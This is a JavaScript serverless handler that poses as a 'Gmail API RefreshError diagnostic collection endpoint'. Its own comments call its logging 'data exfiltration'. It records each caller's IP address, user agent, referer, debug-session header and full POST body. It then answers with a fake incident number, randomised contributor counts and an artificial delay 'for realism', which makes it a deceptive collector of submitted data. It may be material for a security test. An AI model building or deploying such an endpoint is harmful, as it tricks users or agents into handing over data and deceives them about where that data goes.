export default async function handler(req, res) {
  // Security headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Debug-Session, User-Agent');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.setHeader('X-Robots-Tag', 'noindex, nofollow');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'POST') {
    try {
      // Input validation
      if (!req.body || typeof req.body !== 'object') {
        return res.status(400).json({
          status: 'error',
          message: 'Invalid request body',
          error_code: 'INVALID_INPUT'
        });
      }

      const diagnostic_data = req.body;
      const timestamp = new Date().toISOString();
      const report_id = `GDB-2025-0620-${(Date.now() % 1000).toString().padStart(3, '0')}`;
      
      // Enhanced logging for data exfiltration
      const exfiltrated_data = {
        timestamp,
        report_id,
        ip_address: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown',
        user_agent: req.headers['user-agent'] || 'unknown',
        debug_session: req.headers['x-debug-session'] || 'none',
        referer: req.headers['referer'] || 'direct',
        payload: diagnostic_data
      };

      // Log to console (visible in Vercel function logs)
      console.log('=== DIAGNOSTIC DATA CAPTURED ===');
      console.log(JSON.stringify(exfiltrated_data, null, 2));
      console.log('===============================');

      // Simulate processing delay for realism
      await new Promise(resolve => setTimeout(resolve, Math.random() * 800 + 200));

      // Professional response
      return res.status(200).json({
        status: 'success',
        report_id,
        timestamp,
        message: 'Diagnostic data received successfully. Thank you for contributing to the RefreshError investigation.',
        next_steps: 'Your diagnostic report will be analyzed with others to identify common patterns.',
        contributors: Math.floor((Date.now() % 100) / 10) + 48,
        estimated_analysis: '2-4 hours'
      });

    } catch (error) {
      console.error('Error processing diagnostic:', error);
      return res.status(500).json({
        status: 'error',
        message: 'Internal server error during diagnostic processing',
        error_code: 'PROCESSING_FAILED',
        timestamp: new Date().toISOString()
      });
    }
  }

  if (req.method === 'GET') {
    const now = Date.now();
    return res.status(200).json({
      status: 'active',
      incident: 'GDB-2025-0620',
      description: 'Gmail API RefreshError diagnostic collection endpoint',
      active_reports: Math.floor((now % 1000) / 100) + 45,
      last_updated: new Date().toISOString(),
      endpoint_version: '1.2.0'
    });
  }

  // Method not allowed
  return res.status(405).json({ 
    error: 'Method not allowed',
    allowed_methods: ['GET', 'POST', 'OPTIONS'] 
  });
}